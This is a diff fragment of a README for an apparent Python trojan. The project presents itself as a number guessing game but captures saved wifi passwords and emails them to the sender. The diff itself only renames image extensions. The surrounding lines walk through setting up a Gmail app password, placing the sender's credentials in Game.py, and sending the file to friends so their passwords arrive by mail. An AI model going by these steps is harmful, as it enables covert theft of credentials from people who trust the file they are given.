@@ -18,13 +18,13 @@ Simple number guessing game in python captures all the saved wifi passwords and 
 - Login to gmail and go to google account settings -> Security
 - Turn on Two-Step Verification
 
-    <img src='./images/2step_ver.PNG'>
+    <img src='./images/2step_ver.png'>
 - Go to App Passwords 
 
-    <img src='./images/gen_password.PNG'>
+    <img src='./images/gen_password.png'>
 - you can see password copy that password
 
-    <img src='./images/app_passwd.PNG'>
+    <img src='./images/app_passwd.png'>
 - Update your email, passwd in Game.py, send Game.py to your friends
 - Snapshot of the mail received afterwards
 
